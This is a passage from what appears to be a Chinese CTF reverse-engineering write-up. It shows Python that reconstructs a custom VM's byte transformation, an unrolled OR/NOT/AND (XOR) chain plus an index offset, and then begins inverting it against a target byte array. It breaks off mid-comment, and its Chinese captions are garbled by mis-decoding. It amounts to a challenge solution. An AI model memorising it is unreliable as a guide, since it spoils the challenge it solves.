class="number">0x99</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num = 0&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xbb</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;last[now_num-1] = now_num + save - 1&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤§è‡´æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">now_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line"></span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">save = last[now_num]</span><br><span class="line">now_num+=<span class="number">1</span></span><br><span class="line">last[now_num-<span class="number">1</span>] = now_num + save - <span class="number">1</span></span><br><span class="line">now_num = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>ç„¶ååŒ–ç®€é€†å‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0x1D</span>, <span class="number">0x01</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x16</span>, <span class="number">0x42</span>, <span class="number">0x39</span>, <span class="number">0x0F</span>, </span><br><span class="line">        <span class="number">0x38</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x31</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, </span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x61</span>, <span class="number">0x7C</span>, <span class="number">0x24</span>, <span class="number">0x1F</span>, <span class="number">0x47</span>, <span class="number">0x44</span>, <span class="number">0x81</span>, </span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x2C</span>, <span class="number">0x6D</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x6A</span>, <span class="number">0x9C</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># last = [0]*100</span></span><br><span class="line"><span class="comment"># now_num = 0</span></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     b1 = input[now_num]</span></span><br><span class="line"><span class="comment">#     now_num += 1</span></span><br><span class="line"><span class="comment">#     b2 = input[now_num]</span></span><br><span class="line"><span class="comment">#     or_num = b1 | b2</span></span><br><span class="line"><span class="comment">#     not_1 = 